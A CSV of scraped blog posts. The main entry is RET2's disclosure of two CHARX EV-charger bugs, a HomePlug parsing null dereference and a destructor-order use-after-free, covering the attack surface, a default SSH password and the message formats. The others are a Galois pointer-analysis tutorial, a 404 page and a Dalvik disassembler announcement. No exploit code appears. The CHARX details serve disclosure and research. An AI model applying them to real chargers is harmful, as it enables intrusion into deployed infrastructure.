url,text,
https://blog.ret2.io/2024/07/17/pwn2own-auto-2024-charx-bugs/,"  Pwn2Own Automotive: CHARX Vulnerability Discovery | RET2 Systems Blog           ENGINEERING BLOG   Pwn2Own Automotive: CHARX Vulnerability Discovery Abusing Subtle C++ Destructor Behavior for a UAF     July 17, 2024          /   Jack Dates  The first Pwn2Own Automotive introduced an interesting category of targets: electric vehicle chargers. This post will detail some of our research on the Phoenix Contact CHARX SEC-3100 and the bugs we discovered, with a 2nd separate post covering the actual exploit. We’ve adapted the fundamental bug pattern into a challenge hosted on our in-browser WarGames platform here, if you want a hands-on attempt at exploiting the rather interesting C++ issue we discovered. Although an EV charger may initially seem like an “exotic” target with non-standard protocols and physical interfaces, once those are figured out, everything eventually boils down to some binary consuming untrusted input (e.g. from the network), and all the classic memory corruption principles apply.  Why the CHARX? The CHARX was an appealing target for two primary reasons. The first was simply how different it is as a product compared to the other chargers. While the rest of the targets seemed more retail / consumer facing, the CHARX is more “industrial,” a DIN-rail mounted unit seemingly more for infrastructure than actual charging. Its status as an outlier immediately piqued our interest. Another more practical reason was that the firmware could be easily downloaded from the manufacturer’s website, and was not encrypted. The provided .raucb bundle is intended for use with rauc, but can also be treated as a squashfs filesystem image for mounting or extracting directly. Recon - Mapping Attack Surface Once we had decided to actively perform research against the CHARX, we began by enumerating and evaluating potential attack surface. The CHARX runs a custom embedded version of Linux for 32-bit ARM. SSH is enabled by default, with the unprivileged user user-app having default password user. In terms of physical ports, the two of interest to us were the two ethernet ports, labeled ETH0 and ETH1. ETH0 is intended to provide a connection to the “outside world,” most likely a larger network and/or the Internet, whereas ETH1 is intended to connect to the ETH0 port of an additional CHARX. In this manner, CHARX units can be daisy-chained such that they all communicate. Firewall rules within /etc/firewall/rules define which ports (and therefore services) are accessible on these two interfaces. With these rules, some time poking around the system via ssh, and brief reverse engineering, we ended up with the following rough “map” of services, a guide indicating possible attack surface:  CHARX remote attack surface Some services can be interfaced with directly through their TCP servers, while several can only be addressed indirectly through MQTT messages. MQTT employs a publish-subscribe model where a client can subscribe to any number of topics, and when any client publishes a message to a topic, the message will be forwarded to all subscribers. Most of the binaries for these services are located at /usr/sbin/Charx*. Most services are Cython based, where python code (with some extra syntax for native functionality) is compiled into native binaries / shared objects instead of being interpreted. Reverse engineering Cython proved tedious, so we chose to focus mostly on the Controller Agent service, a native C++ binary. Controller Agent Overview The controller agent is represented towards the upper left of the attack-surface diagram, and is reachable over the eth1 port / interface. This port is intended to connect to an additional CHARX, but in our attack scenario we’ll be connecting a machine directly. To provide some context, we came across three main functions of the controller agent: manage communication between other daisy-chained CHARX units manage the AC controller (a separate MCU on the board) V2G (vehicle-to-grid) protocol messaging (related to vehicles selling electricity back to the grid) In terms of actual interaction, the agent can be talked to over UDP, TCP, and the HomePlug Green PHY protocol. We’ll give a brief overview of each communication channel, and discuss specifics later as they become relevant. TCP JSON Messaging The TCP server is conceptually the simplest method of communication. The agent listens on port 4444, accepts messages in JSON format, and provides JSON responses. Each message is a JSON object with the following format: {    ""operationName"": ""deviceInfo"", // operation requested    ""deviceUid"": ""root"",           // target device of operation    ""operationId"": 0,              // reference ID to echo in response    ""operationParameters"": {}      // optional operation-specific params} The deviceUid field specifies the target device in a “device tree” of sorts maintained by the agent. For our purposes, this will mostly be root to indicate the controller agent itself, but there is also a device node representing the AC controller MCU, and there would be other nodes for daisy-chained units if they existed and had performed the proper “handshake.” Some of the supported operations are: deviceInfo : obtain info for specified device childDeviceList : list children in device tree dataAccess : generic hardware data e.g. reading temperature of AC controller (unsupported by root agent) configAccess : read/write configuration variables heartbeat v2gMessage : proxies / handles V2G messages / responses If the target device is the agent itself, the message is handled directly. Otherwise it gets forwarded to the proper device (e.g. proxied to a daisy-chained CHARX). UDP Broadcast Discovery UDP is primarily used for autodiscovery of daisy-chained units, after which communication would occur over TCP. This is done with UDP broadcast packets on port 4444. The basic idea is: root agent broadcasts a deviceInfo JSON request message daisy-chained sub-agent responds root agent gets IP from response, uses it to connect to sub-agent over TCP port 4444 There isn’t much complexity here, since it’s simply for initial discovery. HomePlug HomePlug is a family of protocols for powerline communications (PLC). That is, transmitting data over electrical wiring. Specifically, the HomePlug Green PHY protocol is the one relevant here. The protocol is defined in terms of standard ethernet packets. In practice, a dedicated SoC (e.g. some Qualcomm chip) would perform the translation of ethernet packets into raw powerline signals, and vice versa. It would seem these chips are present on certain CHARX models (although not the 3100 model we had for the contest), intended to be exposed to Linux userspace as interface eth2 (compared to the physical ethernet ports for eth0 and eth1). The usage of PLC is interesting and provides some background, but is ultimately irrelevant, since the protocol is just ethernet, and we only need to concern ourselves with sending / receiving raw packets. Ethernet / layer-2 packets have a 10-byte header followed by the data payload.  Notably, the 16-bit EtherType field in the header determines the protocol, which in the case of HomePlug Green PHY would be 0x88e1. The controller agent sends and receives these packets by opening a raw socket: socket(AF_PACKET, SOCK_RAW, htons(0x88e1)) Reading or writing to the raw socket sends or receives an entire raw packet, including the header. The indicated protocol 0x88e1 means when reading from the socket, the kernel will only deliver packets with the specified EtherType. The raw socket is bound to an interface, to and from which packets are routed directly. Normally this would be the special eth2 interface for PLC, but the interface can be configured via a configAccess message (over TCP) prior to starting the HomePlug “server.” We can conveniently set this to eth1 (for the physical ETH1 port), to which we’ll already be connected. The HomePlug functionality is closely related to V2G, and the HomePlug “server” is started by sending a v2gMessage request over TCP, with a “subscribe” method type. Bug #1: HomePlug Parsing Mismatch The first vulnerability we used ends up causing a simple null dereference, allowing us to crash the service at will. This may seem useless at first, but will prove its usefulness later on. The HomePlug “server” run by the controller agent reads packets from its raw socket, and handles each one. HomePlug packets are called MMEs (management message entries), and have a 5-byte header followed by the message payload: 1-byte Version 2-byte MMTYPE for the message type, i.e. an “opcode” 2-byte fragmentation info (unused by the agent) Note that rather than being a full implementation, the agent implements only a subset of the features / MMTYPEs of the Green PHY protocol (for instance, ignoring fragmentation info). You can find an archived version of the full spec here. For context, message opcodes commonly come in send / respond pairs. From the spec, the naming scheme follows: Request messages always end in .REQ. The response (if any) to a Request message is always a Confirmation message, which ends in .CNF. Indication messages always end in .IND. The response (if any) to an Indication message is always a Response message, which ends in .RSP. The MMTYPE of interest here is CM_AMP_MAP.REQ (0x601c), which is used to send an “amplitude map.” The message payload is of the form: 2-byte AMLEN indicating the size of the following array of 4-bit numbers n-byte AMDATA of length (AMLEN+1)/2 The agent represents MMEs as subclasses of an MMEFrame class, which for this MMTYPE would be MME_CM_Amp_Map_Req. To parse the various message payloads, which all have different structures, MMEFrame objects use the concept of what I’ve denoted “blobs,” which are chunks of the message body copied out into separate vectors, and tagged with a “type” indicating which field they represent. Parsing populates blobs, MME handling queries / uses the blobs. The following is pseudocode of the constructor for MME_CM_Amp_Map_Req, which is passed a pointer to the start of the MME (including the 5-byte header): MME_CM_Amp_Map_Req(MME_CM_Amp_Map_Req* this, unsigned char *raw, unsigned rawsz, unsigned amlen){    if ( rawsz <= 5 )        return;    if ( !amlen ) { // will be zero when parsing packet as input        amlen = raw[5];        amlen |= raw[4] << 8;    }    this->amlen = amlen;    unsigned short ambytes = (amlen + 1) >> 1;    if ( MMEFrame::hdr_size(a1) + 2 + ambytes > rawsz ) // hdr_size is 5        return;    MMEFrame::add_blob(this, raw, 0, 2, Amp_Map_AMLEN); // copies bytes after header [0, 2)    MMEFrame::add_blob(this, raw, 2, ambytes, Amp_Map_AMDATA); // copies bytes after header [2, ambytes)    this->valid = 1;} Remember that the header is 5 bytes, so the message payload should start at offset 5. Given that AMLEN is the first field in that payload, AMLEN should be bytes 5 and 6. However, this constructor erroneously uses bytes 4 and 5. This incorrect value determines the length of the AMDATA blob stored for later. The “correct” AMLEN is also stored as a blob. What we end up with is the “correct” length in the AMLEN blob, but an AMDATA blob with a completely different size. To see what this “weird state” can lead to, let’s see what happens after parsing. Rough pseudocode of the handler for this MMTYPE is shown below. It essentially copies AMLEN entries in a loop from the AMDATA blob into a “session-local” vector: EVSEMMEHandler::VSLACSession* session = ...;std::vector<unsigned char> blob;MMEFrame::get_blob(&blob, mme, Amp_Map_AMLEN);unsigned amlen = blob[0] | (blob[1] << 8); // ""correct"" length// individually copy entries from the AMDATA blob// MMEFrame::get_amdata is essentially AMDATA[i] but for 4-bit entriesfor (unsigned i = 0; i < amlen; i++)    session->amp_map.append(MMEFrame::get_amdata(mme, i)); The number of loop iterations uses the “correct” AMLEN, however the AMDATA blob being iterated over is not actually that size! If it’s smaller, AMDATA[i] may be out of bounds. Now, you may be thinking… Hold up, I was expecting a meager null deref… this looks more like an out-of-bounds read!   This is technically an out-of-bounds read, and initially seemed promising for an information leak. However, while there did seem to exist code for echoing the “session-local” vector back over the wire, we unfortunately could not find any xrefs or code paths able to actually trigger it. Instead, as a consolation prize, we can utilize the fact that a std::vector of size 0 will have a null pointer for its backing store, and attempting to read from this vector during the loop causes a null dereference. However, the SIGSEGV from the null dereference isn’t necessarily the end of the line for the process, which brings us to our next bug… Bug #2: Use-After-Free on Process Teardown The second vulnerability we leveraged was a UAF that occurred during cleanup before process exit, which we discovered mostly by accident. Sometimes in vulnerability research, you spend weeks staring at code to no avail (which we initially did, finding the HomePlug bug). Other times, you simply attach gdb, continue after a few seconds, and magically get a segfault… The reason this was happening was some sort of system monitor was detecting the service had hung (due to being paused in gdb). The monitor then sent SIGTERM to the process, with the intent of shutting it down cleanly, and restarting the service afterwards. However, some bug was being triggered “organically” during the exit handlers. Exit Handlers In the CharxControllerAgent binary, a considerable number of exit handlers are registered by __aeabi_atexit, which seems to be implicitly emitted by the C++ compiler to destruct globals declared as static. Since static variables are constructed once but stay alive indefinitely, the C++ runtime registers exit handlers to ensure their destruction. The most relevant static global is a ControllerAgent object, a massive root object for encapsulating nearly all of the agent’s state. This is initially constructed in main, where the destructor is also registered as an exit handler. On a related note, the agent installs several signal handlers as well. For SIGTERM and SIGABRT, the handler sets a global boolean indicating the main run-loop should stop, cleanly returning from main. For SIGSEGV, the handler manually invokes exit(1). Consequently, delivery of any of these signals ends up triggering exit handlers. In other words, our previously useless null dereference can be used to invoke the SIGSEGV signal handler, which calls exit and will end up triggering the exit-handling bug! Let’s take a look at what the actual issue turned out to be… Destructors Considered Harmful Before going into the CHARX-specific details, we’ll demonstrate the same bug pattern using a simple toy example, which will be easier to reason about. See if you can spot the bug in the following code… #include <vector>#include <stdio.h>class Outer;// inner class with back-reference to outer classclass Inner {    public:        Outer* outer;        int idx;        Inner(Outer* o) : outer(o), idx(-1) {}        ~Inner();        void init(long val);};// outer class holds inner class and some shared state// (in this case a vector the inner class can add/remove from)class Outer {    public:        Inner inner;        std::vector<long> values;        Outer() : inner(this) {}        int add(long val) {            values.push_back(val);            return values.size()-1;        }        void remove(int i) {            printf(""log values: 0x%lx 0x%lx "", values[0], values[1]);            values[i] = 0;        }};// reserve a slot in the shared vectorvoid Inner::init(long val) {    idx = outer->add(val);}// on destruction, invalidate the slotInner::~Inner() {    if (idx != -1)        outer->remove(idx);}int main() {    static Outer o;    o.values.push_back(0x41414141);    o.inner.init(0x42424242);    return 0;} Consider what occurs when returning from main. This will end up invoking the destructor for Outer, which would have been registered as an exit handler after construction. But, what happens during this destructor? It’s not explicitly defined, so it will be whatever default destructor the C++ compiler creates. According to the C++ Reference: … the compiler calls the destructors for all non-static non-variant data members of the class, in reverse order of declaration … In other words, for Outer, the vector is destructed before the inner class. This leads to the following chain of events when destructing Outer:  This is a very subtle bug, mostly caused by the implicit nature of C++, combined with the pattern of an inner class calling back into the outer class during destruction. An interesting consequence of this implicitness is that simply switching the two lines declaring the members inner and values “patches” the bug, since the destructors would then be called in the opposite order. The ControllerAgent destructor The actual bug follows this same pattern. Almost all of the controller agent’s global structures / state are rooted in a ControllerAgent class instance. In turn, this object’s destructor performs most of the program’s cleanup. As mentioned, this destructor is registered as an exit handler. One of the ControllerAgent fields is a std::list<ClientSession>, a list of “sessions” each representing a connected client. This is the std::vector analog of our toy example. Another field is a “manager” ClientConnectionManagerTcp, which internally holds a list of ClientConnectionTcp objects representing TCP clients. This is the inner analog of our toy example. These two lists are conceptually one-to-one, where each lower-level ClientConnectionTcp has a corresponding higher-level ClientSession. An integral “connection ID” associates each object with the other. When the lower-level TCP connection is closed, the “manager” (ClientConnectionManagerTcp) cleans up both objects. It owns the lower-level object and can perform the cleanup itself, but to clean up the higher-level object, it calls back into a ControllerAgent function to notify it that the matching ClientSession should be invalidated. This involves iterating through the std::list<ClientSession> looking for the matching ID. However, this breaks during destruction, since the std::list<ClientSession> gets destructed before ClientConnectionManagerTcp: ~ControllerAgent kicks off cleanup ~std::list<ClientSession> frees all linked list nodes  this is most likely the default standard-library-defined destructor ~ClientConnectionManagerTcp starts cleaning up lower-level TCP connections  calls back into ControllerAgent to invalidate a connection ID ControllerAgent attempts to search its std::list<ClientSession> for the matching ID in this half-destructed state, this std::list is already gone… UAF! Next Up: Exploitation At this point, we have a UAF primitive, with the caveat that it can be triggered just once on process exit (which we can initiate at will with the null dereference). We found the very subtle destructor ordering issue quite interesting, as an example of how the implicit nature of C++ can lead to unexpected and easy-to-miss vulnerabilities. It’s similarly common to overlook bugs only occurring on process exit. The exploitation process is covered in a follow-up post. Also, if you want to take a crack at exploiting the same core bug pattern (but with ASLR disabled!), check out this challenge on our in-browser WarGames platform. For reference, the ZDI advisories / CVE assignments are listed here: HomePlug null dereference: CVE-2024-26003, ZDI-24-860 Destructor UAF: CVE-2024-26005, ZDI-24-861   GITHUB | TWITTER | BLOG | CONTACT (C) 2024 RET2 SYSTEMS, INC.  "
https://galois.com/blog/2022/08/cclyzer/,"   A Visual Guide to Pointer Analysis with cclyzer++: Part 1 - Galois, Inc.                 Galois, Inc. Menu R&D Services News Blog Tech Reports Tech Talks CAMET Team Careers    Blog > A Visual Guide to Pointer Analysis with cclyzer++: Part 1   Categories Artificial Intelligence Conferences Cryptography Cyber-Physical Systems Data Science Demo Digital Engineering Domain Specific Languages Elections Formal Methods Functional Programming Hardware Highlights Human Factors Engineering Life at Galois Machine Learning Mobile Security Network Security News Open-source Security Systems Software Tech Talks Tools Crux Cryptol SAW Uncategorized  Share this article Facebook Twitter LinkedIn+  Subscribe Get notified about new posts  							Email Address						   							Sign Up						  A Visual Guide to Pointer Analysis with cclyzer++: Part 1 Tuesday, August 23, 2022 Open-source, Tools Langston Barrett Pointer analysis is a foundational static analysis with applications to the problems of program optimization, verification, bug finding, and many others. Galois recently released cclyzer++, a scalable and precise open-source pointer analysis for languages that compile to LLVM, especially C and C++. cclyzer++ is based on the cclyzer project, which was authored by George Balatsouras and Yannis Smaragdakis. This two-part blog post series visually illustrates the essence of cclyzer++ by means of examples. At the end of this series, you’ll be able to read simple LLVM programs (unoptimized, compiled by Clang from simple C programs). You’ll be prepared to read and understand the output of a pointer analysis for LLVM, and to evaluate how precisely it approximates the behavior of the corresponding program. In particular, you’ll be able to explain how cclyzer++ produces the following graph from a program that uses linked lists and what the graph says about the behavior of the program. For more information about cclyzer++, see the project documentation. Why Pointer Analysis Pointer analysis is necessary for accurate static approximation of inter-procedural control- and data-flows of pointer-manipulating programs. As a result, many analyses and applications that depend on inter-procedural reasoning rely on pointer analysis (or would be greatly improved if they did), such as: Program understanding Visualizing a program’s call-graph Listing the callers of a function Security Static taint tracking Whole-program static analysis, e.g. to find potential memory corruption Program optimization Alias analysis Automatic parallelization Program verification Construction of scalable memory models Abstraction The goal of a pointer analysis is to compute the points-to relation: a mapping from program variables and allocations to the set of all allocations they may point to when the program is executed. However, the set of stack and heap allocations made by a program at runtime can be unbounded. In the following C program, it’s impossible to tell how many times the while loop and its call to malloc will be executed. int main() {  while (rand() % 2 == 0) {   char *z = malloc(1);   f(z);  }  return 0; } To ensure termination and scalability, cclyzer++ abstracts sets of allocations by their allocation site. In a C program, an allocation site can be: A global variable A stack allocation (e.g., a call to alloca or a local variable which has its address taken with &) A heap allocation (e.g., a call to malloc or realloc) In this blog post, we’ll label abstract allocations like so (this is a somewhat arbitrary choice, and is slightly simpler than the way cclyzer++ actually labels allocations): global@global_var for a global variable global_var stack@main[y] for a stack allocation in function main of a variable y heap@main[z] for a heap allocation in function main assigned to a variable z The points-to relation then consists of a mapping from variables and abstract allocations to sets of abstract allocations that over-approximate the points-to relations that can hold during all program executions. Visual Grammar To illustrate the analysis algorithm, we can draw the points-to relation as a graph. Variables are drawn in ellipses, allocations are drawn in boxes, and edges are the ""points-to"" relation. C and LLVM LLVM is a low-level programming language used internally by several compilers including Clang and rustc. cclyzer++ analyzes LLVM code, but don’t fret if you’re not already familiar with LLVM – all the examples are shown first in C, relevant LLVM concepts will be explained along the way, and LLVM is at a comparable level of abstraction with C in the first place. Allocations Allocation sites are the starting point for the analysis. In brief, a variable at an allocation site points to the abstract allocation corresponding to that allocation site. Let’s see some examples: Stack Allocations Consider the following C program: int main(int argc, char *argv[]) {  int z;  // ... address taken somewhere with ""&z"" ...  return 0; } Assuming this program takes the address of z, the compiler has to allocate it on the stack. At the LLVM level, this happens with the alloca instruction: define @main(i32 %argc, i8** %argv) { entry:  %z = alloca i32*, align 8  ret i32 0 } (In LLVM, local variables all start with %, whereas globals and function names start with @. Note also that on x86_64, the C type char compiles to the LLVM type i8, and int to i32.) The points-to graph of this LLVM program has just the one variable z, and it points to its stack allocation: Heap Allocations It’s a similar story for heap allocations. #include <stdlib.h> int main(int argc, char *argv[]) {  char *z = malloc(1);  return 0; } Here’s what the call to malloc looks like at the LLVM level. Mostly, everything’s just a tad more explicit. define @main(i32 %argc, i8** %argv) { entry:  %z = call i8* @malloc(i64 1)  ret i32 0 } Again, the points-to graph just has the variable z, and it points to the abstract allocation corresponding to the call to malloc. Global Allocations Finally, let’s look at global variables. int z; int main(int argc, char *argv[]) { return 0; } At first glance, it might not be clear that there are any pointers at all in this program (other than argv, which we’ll ignore). However, all global variables are pointers at the LLVM level. It’s not obvious from the code, but the expression @z has type i32*: @z = common global i32 0, align 4 define i32 @main(i32 %argc, i8** %argv) { entry:  ret i32 0 } Thus, every global variable has a corresponding global variable allocation that it points to. Casts C allows us to cast between pointers with different types (modulo certain restrictions). For instance, we can cast an int* to a void* to pass it to memset: #include <stdlib.h> #include <string.h> int main(int argc, char *argv[]) {  int *x = (int *) malloc(sizeof(int));  memset((void *) x, 0, sizeof(int));  return 0; } At the LLVM level, these casts become bitcast instructions: define i32 @main(i32 %argc, i8** %argv) { entry:  %x1 = call noalias i8* @malloc(i64 4)  %x2 = bitcast i8* %x1 to i32*  %x3 = bitcast i32* %x2 to i8*  call void @llvm.memset.p0i8.i64(i8* align 1 %x3, i8 0, i64 4, i1 false)  ret i32 0 } (The C-level memset compiles to the strange function @llvm.memset.p0i8.i64, but it’s safe to ignore that detail for our purposes.) Just like a C cast, bitcast doesn’t alter its argument at all; the output of a bitcast points to whatever the input pointed to. Stores Stores to Heap Pointers Take a look at the following program, which stores a pointer to another pointer: #include <stdlib.h> int main(int argc, char *argv[]) {  char **x = malloc(sizeof(char*));  char *y = malloc(sizeof(char));  *x = y;  return 0; } At the LLVM level, stores like *x = y become store instructions: define i32 @main(i32 %argc, i8** %argv) { entry:  %x1 = call noalias i8* @malloc(i64 8)  %x2 = bitcast i8* %x1 to i8**  %y = call noalias i8* @malloc(i64 1)  store i8* %y, i8** %x2, align 8  ret i32 0 } Here’s what the points-to graph would look like just before the store instruction is executed: After %y gets stored to %x2, the allocation that %x2 points to (that is, heap@main[%x1]) will point to whatever %y points to (that is, heap@main[%y]). Visually: Multiple Stores to the Same Pointer In all of the examples we’ve seen so far, the analysis has been pretty precise – each variable and allocation pointed to at most one allocation. Multiple stores to the same allocation result in more complex points-to graphs. #include <stdlib.h> int main(int argc, char *argv[]) {  char **x = malloc(sizeof(char*));  char *y = malloc(sizeof(char));  char *z = malloc(sizeof(char));  *x = y;  *x = z;  return 0; } define i32 @main(i32 %argc, i8** %argv) { entry:  %x1 = call noalias i8* @malloc(i64 8)  %x2 = bitcast i8* %x1 to i8**  %y = call noalias i8* @malloc(i64 1)  %z = call noalias i8* @malloc(i64 1)  store i8* %y, i8** %x2, align 8  store i8* %z, i8** %x2, align 8  ret i32 0 } Here’s what the points-to graph looks like before both store instructions are executed: After both store instructions: This result isn’t completely satisfying; at runtime, the concrete allocation represented by heap@main[%x1] can’t actually point to both heap@main[%y] and heap@main[%z] at the same time. This is yet another form of abstraction that’s used to retain scalability – cclyzer++ is flow-insensitive, meaning it doesn’t precisely model the control flow of the target program. It computes a single points-to relation for all points in the program, rather than one points-to relation for each point in the program. Stores to Globals and Modeling Null Finally, let’s look at a store to a global variable: #include <stdlib.h> char *g = NULL; int main(int argc, char *argv[]) {  char *x = malloc(sizeof(char));  g = x;  return 0; } @g = global i8* null, align 8 ; Function Attrs: noinline nounwind uwtable define i32 @main(i32 %argc, i8** %argv) { entry:  %call = call noalias i8* @malloc(i64 1)  store i8* %call, i8** @g, align 8  ret i32 0 } The global variable is initialized to null. cclyzer++ models null as a special allocation that participates in the points-to relation like any other allocation would (up to some special handling here and there). null never points to any other allocation because it can’t be stored to nor loaded from. Here’s the points-to graph before the store: After the store: Loads Let’s look at loads, that is, dereferencing pointers. #include <stdlib.h> int main(int argc, char *argv[]) {  char **x = malloc(sizeof(char*));  char *y = malloc(sizeof(char));  *x = y;  char *z = *x;  return 0; } At the LLVM level, loads like *x become load instructions. Appending to our first store example: define @main(i32 %argc, i8** %argv) { entry:  %x1 = call i8* @malloc(i64 8)  %x2 = bitcast i8* %x1 to i8**  %y = call i8* @malloc(i64 1)  store i8* %y, i8** %x2, align 8  %z = load i8*, i8** %x2, align 8  ret i32 0 } As shown above, the points-to graph just after the store looks like this: Loading from an allocation ""undoes"" storing to it – it retrieves whatever was previously stored. Think of each allocation as a box. Stores put items into the box, and loads take out whatever was previously put in. In this example, loading from %x2 retrieves the pointer stored in heap@main[%x1], which points to heap@main[%y]. This pointer is assigned to the variable %z. When an allocation points to multiple allocations, all of them get retrieved by a load; everything that was put in the box gets taken back out again. Extending the program above with multiple stores, #include <stdlib.h> int main(int argc, char *argv[]) {  char **x = malloc(sizeof(char*));  char *y = malloc(sizeof(char));  char *z = malloc(sizeof(char));  *x = y;  *x = z;  char *w = *x;  return 0; } the points-to graph would look like this: Conclusion You’ve now seen most of the essential features of cclyzer++. The next post will explore some more advanced topics and bring it all together with a larger example. Previous Next   Contact About Careers Open Source Privacy Policy Terms of Use  GitHub LinkedIn icon Twitter YouTube icon RSS           Most Recent Tech Talk        Title CVE-2022-37454: A Buffer Overflow Vulnerability Affecting Implementations Of SHA-3 Date Thursday, May 16, 2024  							 								Time 9:30 am Speaker Nicky Mouha Location Arlington, VA About Abstract: For over a decade, a buffer overflow vulnerability in the ""official"" SHA-3 implementation by its designers remained unnoticed. This vulnerability was assigned CVE-2022-37454 and impacted several projects such as Python and PHP that relied on this implementation. We provide a proof of concept for arbitrary code execution and explain how we found the vulnerability using the KLEE symbolic execution tool. In light of the upcoming NIST Workshop on Formal Methods within Certification Programs (FMCP 2024), we give an overview of various approaches to mitigate these types of bugs in cryptographic implementations and discuss both their cost and effectiveness. Bio: Dr. Nicky Mouha is a researcher in cryptography with more than 15 years of experience. Besides his research, he is involved in various standardization activities, mainly at NIST and ISO, including the organization of the upcoming NIST Workshop on Formal Methods within Certification Programs (FMCP 2024). He invented the MILP- and SAT-based techniques for differential and linear cryptanalysis and designed the lightweight Chaskey algorithm (standardized in ISO/IEC 29192-6) which is now widely deployed in the automotive industry. He also discovered vulnerabilities in billions of devices, such as a buffer overflow in the ""official"" SHA-3 implementation (CVE-2022-37454).   Galois News Galois Releases INDIGO to Improve Interoperability Press Release Galois Releases CAMET Base Pack 1.7.1 Press Release Galois Serves Space-BACN for Breakfast Press Release Galois Releases New Versions of Verification Tools SAW, Cryptol, and Crux Press Release   Portland, OR 421 SW 6th Avenue, Suite 300         Portland, Oregon 97204 Arlington, VA 901 N Stuart Street, Suite 501         Arlington, Virginia 22203 Minneapolis, MN 111 Third Avenue South, Suite 350        Minneapolis, MN 55401 Dayton, OH 444 E 2nd Street        Dayton, Ohio 45402 T 503.626.6616 F 503.350.0833 contact@galois.com  © 2024 Galois, Inc.  × Contact Galois We take pride in personally connecting with all interested partners, collaborators and potential clients. Please email us with a brief description of how you would like to be connected with Galois and we will do our best to respond within one business day. General inquiries: contact@galois.com T 503.626.6616 F 503.350.0833 Learn more about our Services View our Technical Areas Stay Connected GitHub Twitter RSS     "
https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_cve-2023-21608/,      Page not found - hackyboiz      Hackyboiz        Home         Archives         Categories         Tags         About         Author                 Search ×  keyword   Hexo Fluid       
https://margin.re/2024/05/dalvik-disassembly/,"           Disassembling Dalvik — Margin Research         About Services Resources Blog  Contact    Disassembling Dalvik         Home Blog Disassembling Dalvik  Disassembling Dalvik by Evan Richter May 29, 2024     In this post, we announce the release of a small library for disassembling Dalvik bytecode. This serves as a foundation for building static analysis tooling for Android applications and system services in Rust. Read on for an example graphview application, or just check out the crate’s source and documentation to get started with your own tooling!BackgroundAndroid uses a custom runtime called ART to execute user applications and background system services on a handset. The bytecode for this runtime is called Dalvik. The bytecode is bundled into one or more Dex files per application, which store constant data, class and type metadata, and provide linking capability to call methods in other dex files (a feature called multidex).Reverse engineers use a multitude of tools when reverse-engineering Android code. Bytecode Viewer is a great choice for quickly switching between multiple high quality Java/Dalvik decompilers. When one decompiler fails, another may succeed, or simply show different but semantically equivalent high level code.For example, this snippet of Dalvik bytecode (disassembled to Smali):.method public toDumpFormat()Ljava/lang/String;  .registers 10  .line 100  new-instance v0, Ljava/text/SimpleDateFormat;  sget-object v1, Ljava/util/Locale;->ENGLISH:Ljava/util/Locale;  const-string v2, ""MM/dd HH:mm:ss.SSS""  invoke-direct {v0, v2, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V decompiles to this original Java code: Locale locale = Locale.ENGLISH;  SimpleDateFormat simpleDateFormat = new SimpleDateFormat(""MM/dd HH:mm:ss.SSS"", locale);  try {   return String.format(locale, ""%s, %s, %s, %s, %d, %d, %d, %s"", this.mType, this.mPackageName, simpleDateFormat.format(new Date(this.mStartTime)), this.mResultTime == 0 ? ""-----------"" : simpleDateFormat.format(new Date(this.mResultTime)), Long.valueOf(this.mLatency), Integer.valueOf(this.mExtra), Integer.valueOf(this.mBadQualityCount), this.mResult);  } catch (Exception e) {   Slog.w(SemBioLoggingManager.TAG, ""toDumpFormat: "" + e.getMessage());   return ""formatting error"";  } The higher-level representation is extremely helpful when analyzing methods of any size. The larger the method, the more difficult and time-consuming it is to pick apart the disassembly directly.So when this happened on a quite large method I needed to reverse, I knew I needed a new solution:Error messages from every decompiler available in Bytecode ViewerNothing in Bytecode Viewer could decompile the method in question!So I reached for another tool, Ghidra. Ghidra can also unpack APK files and decompile the dex files within. And the decompiler view produced readable code, even for the method that had failed previously.Here’s what the example method looks like in Ghidra (Dalvik (listing view) on the left, and pseudo-code on the right):Ghidra listing view and decompiler view showing good quality high level code.But unfortunately it has a fatal flaw! When I click on an exception handling block in the listing view, I expect the cursor in the decompilation to jump to the respective high-level code in a try/catch block. This happens instead:Ghidra listing view of a catch handler in the same method, with an UndefinedFunction in the decompiler view.The related Dalvik bytecode in the handler does decompile; however, it is an Undefined Function, which means it was detached from the method that could jump to the catch block. Dalvik exception handling is essentially invisible in Ghidra's decompiler view. This may be a fundamental issue with Ghidra's pseudo code view, as the target high-level language is C, which does not have exception handling.Understanding control flow is crucial for security researchers. Perhaps even more so in memory safe languages like Java and Kotlin where logic bugs may be the most common form of security flaws.Given the shortcomings of the prior bytecode analysis tools, I needed a unique solution.Building my own toolI needed a higher level representation of the bytecode of some sort. The top priority was to show faithful semantics (e.g. no hiding exception handling code). The other goal was to have an interface better than that of the raw Smali output of apktool d example.apk.While “better” is entirely subjective, I especially needed good support for try/catch, because I could defer to Ghidra’s decompilation for the rest. So I decided to write my own Dalvik disassembler in Rust, with explicit support for control flow visualization of exception handling.Early in the development of the disassembler, I closely matched the output of baksmali so I could easily diff with a known-good representation. This surfaced a few bugs, but in the end wasn’t very helpful as far as the secondary goal: the interface.A Graphviz directed graph with several nodes containing Smali disassembly. Dashed edges represent control flow during exception handling.Exporting a directed graph with Graphviz was the obvious next step because we can visualize control flow without needing to decompile Dalvik to a Java-like language with if/else and try/catch. Dalvik can resolve a lot of high level information when paired with dex metadata, such as function arguments and string references, and I think it would be a great base to explore future decompilation ideas. But for now, this humble graph view helpfully stands in when other existing decompilers fail. It’s a decent middle ground between readability and reliability.If you also have stubborn methods that refuse to decompile, check out the graphview example in our GitHub repo, and if you wish to build other tools in Rust for Dalvik analysis, check out the crates.io page. We’re excited to see what you make!    Share this article:     Subscribe      About Services Resources Blog        Margin Research, LLC New York, NY ©2024 Margin Research. All Rights Reserved.         "
